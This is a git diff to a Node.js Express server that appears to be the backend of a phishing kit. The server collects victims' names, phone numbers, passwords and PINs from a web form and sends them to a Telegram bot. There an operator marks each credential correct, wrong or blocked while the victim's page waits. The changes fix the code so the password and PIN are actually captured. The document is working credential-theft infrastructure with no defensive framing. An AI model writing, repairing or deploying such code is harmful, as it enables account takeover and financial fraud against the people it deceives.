@@ -2,7 +2,6 @@ require('dotenv').config();
 const express = require('express');
 const axios = require('axios');
 const { v4: uuidv4 } = require('uuid');
-const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -35,22 +34,14 @@ console.log('✅ Bots loaded:', bots.map(b => b.botId));
 // ---------------- MIDDLEWARE ----------------
 app.use(express.json({ type: '*/*' }));
 app.use(express.urlencoded({ extended: true }));
-
-// ---------------- BOT ENTRY ROUTE (FIX) ----------------
-app.get('/bot/:botId', (req, res) => {
-  const botId = req.params.botId;
-  const bot = bots.find(b => b.botId === botId);
-
-  if (!bot) {
-    return res.status(404).send('Invalid bot');
-  }
-
-  // Redirect to frontend with botId
-  res.redirect(`/index.html?botId=${botId}`);
-});
-
-// ---------------- STATIC FILES ----------------
 app.use(express.static('public'));
+
+// ---------------- BOT ENTRY ----------------
+app.get('/bot/:botId', (req, res) => {
+  const bot = bots.find(b => b.botId === req.params.botId);
+  if (!bot) return res.status(404).send('Invalid bot');
+  res.redirect(`/index.html?botId=${bot.botId}`);
+});
 
 // ---------------- HELPERS ----------------
 function getBot(botId) {
@@ -67,25 +58,22 @@ async function sendTelegram(bot, text, buttons = []) {
         : undefined
     });
   } catch (e) {
-    console.error('❌ Telegram send error:', e.response?.data || e.message);
+    console.error('❌ Telegram error:', e.response?.data || e.message);
   }
 }
 
 async function answerCallback(bot, id) {
   try {
-    await axios.post(`https://api.telegram.org/bot${bot.token}/answerCallbackQuery`, {
-      callback_query_id: id
-    });
+    await axios.post(
+      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
+      { callback_query_id: id }
+    );
   } catch {}
 }
 
 // ---------------- WEBHOOKS ----------------
 async function setWebhook(bot) {
-  if (!DOMAIN) {
-    console.error('❌ BACKEND_DOMAIN not set');
-    return;
-  }
-
+  if (!DOMAIN) return;
   const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
   try {
     await axios.get(
@@ -93,7 +81,7 @@ async function setWebhook(bot) {
     );
     console.log(`✅ Webhook set for ${bot.botId}`);
   } catch (e) {
-    console.error(`❌ Webhook failed for ${bot.botId}`, e.response?.data || e.message);
+    console.error('❌ Webhook error:', e.response?.data || e.message);
   }
 }
 
@@ -103,35 +91,40 @@ async function setAllWebhooks() {
 
 // ---------------- PASSWORD STEP ----------------
 app.post('/submit-password', (req, res) => {
-  console.log('📥 PASSWORD SUBMIT:', req.body);
+  try {
+    console.log('📥 PASSWORD SUBMIT:', req.body);
 
-  const { name, phone, botId } = req.body;
-  const bot = getBot(botId);
+    const { name, phone, password, botId } = req.body;
+    const bot = getBot(botId);
 
-  if (!bot) {
-    console.error('❌ Invalid bot:', botId);
-    return res.status(400).json({ error: 'Invalid bot' });
-  }
+    if (!bot) {
+      return res.status(400).json({ error: 'Invalid bot' });
+    }
 
-  const requestId = uuidv4();
-  passwordRequests[requestId] = null;
-  requestMeta[requestId] = { name, phone, botId };
+    const requestId = uuidv4();
+    passwordRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
 
-  sendTelegram(
-    bot,
-    `🔐 PASSWORD VERIFICATION
+    sendTelegram(
+      bot,
+      `🔐 PASSWORD VERIFICATION
 
 👤 Name: ${name}
 📞 Phone: ${phone}
 🔑 Password: ${password}
 🆔 Ref: ${requestId}`,
-    [[
-      { text: '✅ Correct Password', callback_data: `pass_ok:${requestId}` },
-      { text: '❌ Wrong Password', callback_data: `pass_bad:${requestId}` }
-    ]]
-  );
+      [[
+        { text: '✅ Correct Password', callback_data: `pass_ok:${requestId}` },
+        { text: '❌ Wrong Password', callback_data: `pass_bad:${requestId}` }
+      ]]
+    );
 
-  res.json({ requestId });
+    res.json({ requestId });
+
+  } catch (err) {
+    console.error('❌ submit-password error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 app.get('/check-password/:id', (req, res) => {
@@ -140,36 +133,41 @@ app.get('/check-password/:id', (req, res) => {
 
 // ---------------- PIN STEP ----------------
 app.post('/submit-pin', (req, res) => {
-  console.log('📥 PIN SUBMIT:', req.body);
+  try {
+    console.log('📥 PIN SUBMIT:', req.body);
 
-  const { name, phone, botId } = req.body;
-  const bot = getBot(botId);
+    const { name, phone, pin, botId } = req.body;
+    const bot = getBot(botId);
 
-  if (!bot) {
-    console.error('❌ Invalid bot:', botId);
-    return res.status(400).json({ error: 'Invalid bot' });
-  }
+    if (!bot) {
+      return res.status(400).json({ error: 'Invalid bot' });
+    }
 
-  const requestId = uuidv4();
-  pinRequests[requestId] = null;
-  requestMeta[requestId] = { name, phone, botId };
+    const requestId = uuidv4();
+    pinRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
 
-  sendTelegram(
-    bot,
-    `🔐 PIN VERIFICATION
+    sendTelegram(
+      bot,
+      `🔐 PIN VERIFICATION
 
 👤 Name: ${name}
 📞 Phone: ${phone}
 🔢 PIN: ${pin}
 🆔 Ref: ${requestId}`,
-    [[
-      { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-      { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
-      { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
-    ]]
-  );
+      [[
+        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
+        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
+        { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
+      ]]
+    );
 
-  res.json({ requestId });
+    res.json({ requestId });
+
+  } catch (err) {
+    console.error('❌ submit-pin error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 app.get('/check-pin/:id', (req, res) => {
@@ -181,8 +179,6 @@ app.get('/check-pin/:id', (req, res) => {
 
 // ---------------- TELEGRAM CALLBACK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
-  console.log('📡 Telegram webhook hit');
-
   const bot = getBot(req.params.botId);
   if (!bot) return res.sendStatus(404);
 
@@ -216,7 +212,7 @@ ${feedback}`
 
 // ---------------- START SERVER ----------------
 setAllWebhooks().then(() => {
-  app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-  });
+  app.listen(PORT, () =>
+    console.log(`🚀 Server running on port ${PORT}`)
+  );
 });
